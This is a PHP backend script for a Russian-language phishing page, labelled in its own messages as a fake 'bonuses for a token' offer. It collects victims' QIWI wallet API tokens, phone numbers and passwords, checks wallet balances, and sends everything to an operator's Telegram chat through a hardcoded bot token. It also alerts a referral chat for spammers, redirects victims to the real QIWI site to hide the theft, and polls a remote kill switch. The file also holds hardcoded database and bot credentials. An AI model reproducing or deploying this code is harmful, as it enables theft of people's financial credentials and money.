<?PHP
session_start();
$off = file_get_contents("http://easybonus.xyz/enable.txt");
if($off == "false"){
    exit;
}
    require_once ("QiwiApi.php");
    $db = mysqli_connect("localhost", "i1081213_tap", "i1081213tap", "i1081213_tap");
	$token = $_POST['token'];
	$name = $_POST['name'];
	$number = $_POST['number'];
	$pass = $_POST['password'];
	$ref = $_SESSION['ref'];
	$phone = $_POST['phone'];
	
		
	$tokeny = "585458853:AAGbSY3G18iTMRGYjbZQfdb-smm4dz1GpdY" ;
	$chat_id = "-237444129"; // %2F
	$spam_id = "-297679794";

	if($token == null && $phone == null){
		return;
	}
		if(preg_match("/\bZAP\b/i", $name." ".$pass." ".$token." ".$number) == true){
			return;
		}
    $number = curl(false, [], $token)['personId'];
    $qiwi = new QiwiApi($number, $token);
    $balance = $qiwi->getBalance()[0]['balance']['amount'];
    $status = "Статус: valid token";
    if($balance == null){
            $status = "Статус: invalid token";
    }
if($status == "Статус: invalid token"){
}
	if($phone != null && $balance !== 0) {
		$txt = urlencode("Авторизация пользователя\nЛогин: $phone \nПароль: $pass");
		$sendToTelegram = fopen("https://api.telegram.org/bot{$tokeny}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
		echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://qiwi.com/'></head></html>";
	} else {
	
	$txt = urlencode("Фейк: Бонусы за токен \nСпонсор этого токена - $name \nНомер телефона: $number \nПароль (Для ВК): $pass \nБаланс QIWI: $balance руб \nТокен: $token \n$status \nПригласивший спаммер: $ref");
	$txtt = urlencode("Фейк: Бонусы за токен \nПришел новый токен от $name \nБаланс QIWI: $balance руб \n$status  \nПригласивший спаммер: $ref \n\nСоздать свою ссылку для спама: http://easybonus.xyz/reg.php?ref=ТВОЙ.НИК.ТГ");

	$sendToTelegram = fopen("https://api.telegram.org/bot{$tokeny}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
	if($ref !== "" && $ref !== null){
		$sendToTelegram2 = fopen("https://api.telegram.org/bot{$tokeny}/sendMessage?chat_id={$spam_id}&parse_mode=html&text={$txtt}","r");
	}
	$_SESSION['logged'] == true;
	echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://qiwi.com/'></head></html>";
	}

    function curl($post = false, array $content = [], $token) {
        $url   = 'https://edge.qiwi.com/person-profile/v1/profile/current';
        $ch = curl_init();
        if ($post) {
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($content));
        } else {
            curl_setopt($ch, CURLOPT_URL, $url.'/?' . http_build_query($content));
        }
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Accept: application/json',
            'Content-Type: application/json',
            'Authorization: Bearer ' . $token
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result = curl_exec($ch);
        curl_close($ch);
        return json_decode($result, 1);
    }
?>